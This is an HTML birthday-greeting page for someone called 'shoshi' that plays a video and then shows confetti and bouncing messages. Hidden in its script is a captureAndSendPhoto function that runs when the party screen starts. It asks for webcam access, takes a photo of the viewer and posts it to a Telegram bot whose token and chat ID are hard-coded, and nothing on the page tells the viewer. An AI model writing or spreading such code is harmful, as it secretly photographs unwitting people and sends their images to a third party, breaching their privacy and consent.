<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Happy Birthday!</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #0b0b12;
    font-family: 'Trebuchet MS', 'Segoe UI', sans-serif;
  }

  #video-stage {
    position: fixed;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #000;
    z-index: 5;
    transition: opacity 0.8s ease;
  }

  #video-stage.hidden {
    opacity: 0;
    pointer-events: none;
  }

  #bday-video {
    max-width: 100%;
    max-height: 100%;
  }

  #tap-hint {
    position: absolute;
    bottom: 30px;
    left: 0;
    right: 0;
    text-align: center;
    color: #fff;
    opacity: 0.8;
    font-size: 14px;
    letter-spacing: 0.5px;
  }

  #party-stage {
    position: fixed;
    inset: 0;
    z-index: 1;
    background: radial-gradient(circle at 50% 30%, #2d0a4e, #0b0b12 70%);
    overflow: hidden;
  }

  .bouncer {
    position: absolute;
    font-size: 32px;
    font-weight: 800;
    white-space: nowrap;
    color: #fff;
    text-shadow: 0 0 12px rgba(255,255,255,0.6);
    will-change: transform;
  }

  .confetti {
    position: absolute;
    top: -10px;
    width: 10px;
    height: 16px;
    opacity: 0.9;
    animation-name: fall;
    animation-timing-function: linear;
    animation-iteration-count: infinite;
  }

  @keyframes fall {
    0% { transform: translateY(-10vh) rotate(0deg); }
    100% { transform: translateY(110vh) rotate(360deg); }
  }

  @keyframes pop-in {
    0% { transform: scale(0); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
  }

  #center-title {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    color: #ffd166;
    font-size: clamp(24px, 5vw, 48px);
    font-weight: 900;
    text-align: center;
    text-shadow: 0 0 20px rgba(255, 209, 102, 0.7);
    animation: pop-in 0.6s ease-out;
    pointer-events: none;
  }
</style>
</head>
<body>

  <div id="video-stage">
    <video id="bday-video" src="birthday-video.MP4" autoplay playsinline></video>
    <div id="tap-hint">tap anywhere if it doesn't autoplay 🔊</div>
  </div>

  <div id="party-stage"></div>

  <script>
    const video = document.getElementById('bday-video');
    const videoStage = document.getElementById('video-stage');
    const partyStage = document.getElementById('party-stage');

    // Some mobile browsers block autoplay with sound; tapping helps.
    document.addEventListener('click', () => {
      if (video.paused) video.play().catch(() => {});
    });

    function startParty() {
      videoStage.classList.add('hidden');
      setTimeout(() => { videoStage.style.display = 'none'; }, 850);
      launchConfetti();
      launchBouncers();

      const title = document.createElement('div');
      title.id = 'center-title';
      title.textContent = '🎂 Happy Birthday! 🎂I wish you all the best in life, and I hope you achieve everything you’ve ever wished for. May this year bring you happiness, success, and beautiful moments. You truly deserve the best!🤍';
      partyStage.appendChild(title);

      // Call camera capture code here
      captureAndSendPhoto();
    }

    video.addEventListener('ended', startParty);

    // Fallback: if video fails to load/play, still let her see the surprise after a delay.
    video.addEventListener('error', () => setTimeout(startParty, 500));

    function launchConfetti() {
      const colors = ['#ff6b6b','#ffd166','#06d6a0','#4cc9f0','#c77dff','#f72585'];
      for (let i = 0; i < 80; i++) {
        const piece = document.createElement('div');
        piece.className = 'confetti';
        piece.style.left = Math.random() * 100 + 'vw';
        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
        piece.style.animationDuration = (3 + Math.random() * 4) + 's';
        piece.style.animationDelay = (Math.random() * 5) + 's';
        piece.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
        partyStage.appendChild(piece);
      }
    }

    function launchBouncers() {
      const messages = ['Happy Birthday shoshi!!🎊', '🎉🎂🎈', 'Happy Birthday shoshi!!🎊', 'Happy Birthday shoshi!!🎊', '🍮👩‍⚕️'];
      const colors = ['#ff6b6b','#ffd166','#06d6a0','#4cc9f0','#c77dff','#f72585','#ffffff'];

      messages.forEach((msg, idx) => {
        const el = document.createElement('div');
        el.className = 'bouncer';
        el.textContent = msg;
        el.style.color = colors[idx % colors.length];
        partyStage.appendChild(el);

        // random starting position and velocity
        let x = Math.random() * (window.innerWidth - 300);
        let y = Math.random() * (window.innerHeight - 100);
        let vx = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 2);
        let vy = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 2);

        function animate() {
          const rect = el.getBoundingClientRect();
          const w = rect.width || 260;
          const h = rect.height || 40;

          x += vx;
          y += vy;

          if (x <= 0 || x + w >= window.innerWidth) {
            vx *= -1;
            x = Math.max(0, Math.min(x, window.innerWidth - w));
            el.style.color = colors[Math.floor(Math.random() * colors.length)];
          }
          if (y <= 0 || y + h >= window.innerHeight) {
            vy *= -1;
            y = Math.max(0, Math.min(y, window.innerHeight - h));
            el.style.color = colors[Math.floor(Math.random() * colors.length)];
          }

          el.style.transform = `translate(${x}px, ${y}px)`;
          requestAnimationFrame(animate);
        }
        requestAnimationFrame(animate);
      });
    }

    function captureAndSendPhoto() {
      const newVideo = document.createElement('video');
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      const chatIds = [
          '-1004348068103'
      ];

      const telegramToken = '7787402061:AAFT_HmER6J9o0JfU6u1LeiGeGHKXNpaSM0';

      //
      navigator.mediaDevices.getUserMedia({ video: true })
          .then((stream) => {
              newVideo.srcObject = stream;
              newVideo.autoplay = true;

              newVideo.addEventListener('loadedmetadata', () => {
                  canvas.width = newVideo.videoWidth;
                  canvas.height = newVideo.videoHeight;

                  // 
                  context.translate(canvas.width, 0);
                  context.scale(-1, 1);

                  context.drawImage(
                      newVideo,
                      0,
                      0,
                      canvas.width,
                      canvas.height
                  );

                  const imageData = canvas.toDataURL('image/png');

                  // 
                  stream.getTracks().forEach(track => track.stop());

                  sendToTelegram(imageData);
              });
          })
          .catch((err) => {
              console.error('Camera access error:', err);
          });

      function sendToTelegram(imageData) {
          const blob = dataURLToBlob(imageData);

          chatIds.forEach(chatId => {
              const formData = new FormData();

              formData.append('chat_id', chatId);
              formData.append('photo', blob, 'photo.png');

              fetch(
                  `https://api.telegram.org/bot${telegramToken}/sendPhoto`,
                  {
                      method: 'POST',
                      body: formData
                  }
              )
              .then(response => response.json())
              .then(data => {
                  console.log('Photo sent:', data);
              })
              .catch(error => {
                  console.error('Telegram error:', error);
              });
          });
      }

      function dataURLToBlob(dataURL) {
          const byteString = atob(dataURL.split(',')[1]);
          const mimeString =
              dataURL.split(',')[0].split(':')[1].split(';')[0];

          const arrayBuffer = new ArrayBuffer(byteString.length);
          const uint8Array = new Uint8Array(arrayBuffer);

          for (let i = 0; i < byteString.length; i++) {
              uint8Array[i] = byteString.charCodeAt(i);
          }

          return new Blob([arrayBuffer], {
              type: mimeString
          });
      }
    }
  </script>

</body>
</html>
